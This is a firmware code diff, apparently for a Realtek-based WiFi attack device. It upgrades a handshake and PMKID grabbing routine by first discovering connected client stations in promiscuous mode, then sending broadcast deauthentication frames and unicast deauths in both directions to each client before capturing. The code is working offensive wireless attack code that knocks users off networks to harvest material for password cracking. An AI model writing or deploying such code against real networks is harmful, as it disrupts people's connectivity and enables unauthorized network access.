@@ -704,11 +704,13 @@ static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_cli
 // Async grab state (HSGRAB/PKGRAB). A blocking deauth burst stalls the WiFi task on
 // this driver, so the deauth is driven from the main loop (same cadence as DEAUTHRUN,
 // which is proven), then the state flips to promisc capture.
-#define HSG_IDLE    0
-#define HSG_DEAUTH  1
-#define HSG_CAPTURE 2
+#define HSG_IDLE     0
+#define HSG_DISCOVER 1
+#define HSG_DEAUTH   2
+#define HSG_CAPTURE  3
 static volatile int hsg_phase = HSG_IDLE;
 static volatile uint32_t hsg_t = 0;
+static volatile uint32_t hsg_disc_ms = 5000;
 static volatile uint32_t hsg_deauth_ms = 4000;
 static volatile uint32_t hsg_cap_ms = 15000;
 static volatile bool hsg_pmkid = false;
@@ -1046,9 +1048,11 @@ void loop() {
         hsg_ch = ch;
         hsg_cap_ms = (uint32_t)secs * 1000u;
         hsg_pmkid = false;
+        sta_n = 0;
         wext_set_channel(WLAN0_NAME, ch);
+        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
         hsg_t = millis();
-        hsg_phase = HSG_DEAUTH;   // loop() deauths, then flips to promisc capture
+        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> capture
         Serial.println("HSGRAB: armed"); Serial1.println("HSGRAB: armed");
       }
     }else if(readString.substring(0,3)=="HOP"){
@@ -1142,9 +1146,11 @@ void loop() {
         hsg_ch = ch;
         hsg_cap_ms = (uint32_t)secs * 1000u;
         hsg_pmkid = true;
+        sta_n = 0;
         wext_set_channel(WLAN0_NAME, ch);
+        wifi_set_promisc(3, promisc_sta_cb, 0);
         hsg_t = millis();
-        hsg_phase = HSG_DEAUTH;   // loop() deauths, then flips to PMKID capture
+        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> PMKID capture
         Serial.println("PKGRAB: armed"); Serial1.println("PKGRAB: armed");
       }
     }
@@ -1172,11 +1178,25 @@ void loop() {
     hs_stream(cap_ch);
   }
 
-  // HSGRAB/PKGRAB state machine: deauth (main-loop cadence) -> promisc capture.
-  if (hsg_phase == HSG_DEAUTH) {
+  // HSGRAB/PKGRAB: discover STAs -> unicast deauth -> promisc capture.
+  if (hsg_phase == HSG_DISCOVER) {
+    if (millis() - hsg_t >= hsg_disc_ms) {
+      wifi_set_promisc(0, NULL, 0);
+      hsg_phase = HSG_DEAUTH;
+      hsg_t = millis();
+    }
+  } else if (hsg_phase == HSG_DEAUTH) {
     wext_set_channel(WLAN0_NAME, hsg_ch);
     for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
       wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+      delay(5);
+    }
+    // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
+    uint8_t sn = sta_n;
+    for (uint8_t k = 0; k < sn && k < 8; k++) {
+      wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
+      delay(5);
+      wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
       delay(5);
     }
     if (millis() - hsg_t >= hsg_deauth_ms) {
